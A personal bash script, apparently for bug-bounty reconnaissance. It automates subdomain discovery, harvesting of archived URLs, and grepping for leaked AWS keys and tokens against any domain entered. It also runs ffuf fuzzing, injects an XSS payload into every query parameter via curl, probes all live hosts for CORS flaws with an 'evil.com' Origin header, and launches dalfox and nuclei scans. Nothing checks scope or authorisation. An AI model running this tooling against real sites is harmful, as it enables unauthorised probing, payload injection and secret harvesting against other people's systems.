echo "Karandarjishack Personalise script for Recon"


echo "Enter Domain:"

read target && mkdir -p $target && cd $target && subfinder -d $target -silent | tee subfinder.txt | httpx -silent | tee Livedomains.txt && cat Livedomains.txt | waybackurls | tee Wayback.txt 



echo " Detail Live domain Analysis"

cat subfinder.txt | httpx -cl -sc -silent | tee httpx_detail.txt 



echo " 200 OK"

cat subfinder.txt | httpx -mc 200 -silent > 200_httpx_detail.txt 



echo "4** Series"

cat subfinder.txt | httpx -mc 401,402,403,404 -silent > Fuzz_httpx_detail.txt 


echo "Making of all the file from GF"
cat Wayback.txt | gf aws-keys > gf_aws_keys.txt
cat Wayback.txt | gf idor > gf_idor.txt
cat Wayback.txt | grep "api" > grep_api.txt
cat Wayback.txt | grep "keys" > grep_keys.txt
cat Wayback.txt | grep "token" > grep_token.txt
cat Wayback.txt | grep ".js" > grep_js.txt
cat Wayback.txt | gf lfi > gf_lfi.txt
cat Wayback.txt | gf rce > gf_rce.txt
cat Wayback.txt | gf redirect > gf_redirect.txt
cat Wayback.txt | gf s3-buckets > gf_s3-buckets.txt
cat Wayback.txt | gf ssrf > gf_ssrf.txt
cat Wayback.txt | gf takeovers > gf_takeovers.txt
cat Wayback.txt | gf urls > gf_urls.txt
cat Wayback.txt | grep "=" > gf_xss.txt
cat Wayback.txt | gf xss >> gf_xss.txt



echo " Lets Fuzz the 4** Series"
cat Fuzz_httpx_detail.txt | while read host do ; do ffuf -w /usr/share/wordlists/SecLists/Fuzzing/fuzz-Bo0oM.txt -mc 200 -recursion -ac -u $host/FUZZ ;done


echo "Starting XSS"
cat Wayback.txt | grep "="| qsreplace '"><img src =q onerror=prompt(8)>'| tee WIthpayload.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "prompt(8)>" && echo -e "$host \e[1;31m May be XSS\e[0m\n" || echo "$host \e[1;34m No XSS\e[0m\n" ;done | tee XXS_Result.txt
echo "XXS_Result Saved"


echo "Starting CORS"
cat Livedomains.txt| while read host do ; do curl -qs https://www."$host" -I -H Origin:evil.com | grep -qs "evil.com" && echo "$host \e[1;31mVulnerable to CORS\e[0m\n" || echo "$host \e[1;34mNot Vulnerable to CORS\e[0m\n" ;done | tee CORS.txt
echo "Result saved in CORS.txt"


echo "Starting Dalfox"
cat Wayback.txt | gf xss | sed 's/=.*/=/'| dalfox pipe > dalfox.txt
echo "Dalfox result saved in dalfox.txt"


echo "Starting Nuclei Workflows"
cat Livedomains.txt | nuclei -w /root/nuclei-templates/workflows | tee Workflow.txt
echo "Nuclei result saved in Workflow.txt"



